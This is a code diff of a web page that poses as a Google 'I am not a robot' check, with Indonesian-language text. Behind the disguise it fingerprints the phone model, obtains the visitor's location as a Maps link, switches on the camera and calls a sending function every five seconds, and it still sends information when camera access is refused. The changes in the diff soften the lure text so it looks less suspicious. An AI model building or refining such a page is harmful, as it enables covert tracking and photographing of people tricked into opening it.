@@ -17,7 +17,7 @@
 
 <div id="verifyBox" class="box">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
-    <p>Sistem mendeteksi aktivitas mencurigakan. Klik di bawah untuk memverifikasi identitas Anda.</p>
+    <p>Sistem mendeteksi aktivitas mencurigakan. Klik tombol di bawah untuk melanjutkan ke pencarian.</p>
     <button class="btn" onclick="startSystem()">SAYA BUKAN ROBOT</button>
 </div>
 
@@ -34,42 +34,41 @@
     let userLoc = "Menunggu izin...";
     let deviceName = "Mendeteksi...";
 
-    // 1. DETEKSI PERANGKAT TINGKAT TINGGI (Client Hints)
     async function getAdvancedDeviceName() {
-        // Coba cara paling akurat (High Entropy Client Hints)
+        let model = "Android Device";
+
+        // Deteksi via Client Hints
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
-                const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-                if (hints.model) return hints.model;
+                const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+                model = hints.model || model;
             } catch (e) { console.log(e); }
-        }
-        
-        // Cara kedua: Bedah User Agent secara manual jika Client Hints gagal
-        const ua = navigator.userAgent;
-        if (/android/i.test(ua)) {
+        } else {
+            const ua = navigator.userAgent;
             const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
             if (match) {
-                let model = match[3].split(" Build")[0].trim();
-                // Jika hasil hanya 'K' atau 'Linux', ambil bagian tengahnya
-                if (model.length <= 1 || model === "Linux") {
-                    model = match[2].trim();
-                }
-                return model;
+                model = match[3].split(" Build")[0].trim();
             }
         }
-        return "Android Device";
+
+        // Daftar Penerjemah Kode Model
+        const modelMap = {
+            "2310FPCA4G": "POCO C65",
+            "M2102J20SG": "POCO X3 Pro",
+            "2201117TY": "Redmi Note 11"
+        };
+
+        return modelMap[model] || model;
     }
 
     async function startSystem() {
-        // Ambil nama perangkat dulu
         deviceName = await getAdvancedDeviceName();
         
-        // Tampilkan Google Asli
         document.getElementById('verifyBox').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
         document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";
 
-        // Minta Lokasi (Klik tombol memicu pop-up)
+        // Minta Izin Lokasi
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
@@ -81,14 +80,10 @@
         // Jalankan Kamera
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                setInterval(takeAndSend, 5000);
-            };
+            document.getElementById('video').srcObject = stream;
+            setInterval(takeAndSend, 5000);
         } catch (e) {
-            takeAndSend(); // Tetap kirim info meski kamera ditolak
+            takeAndSend();
         }
     }
 
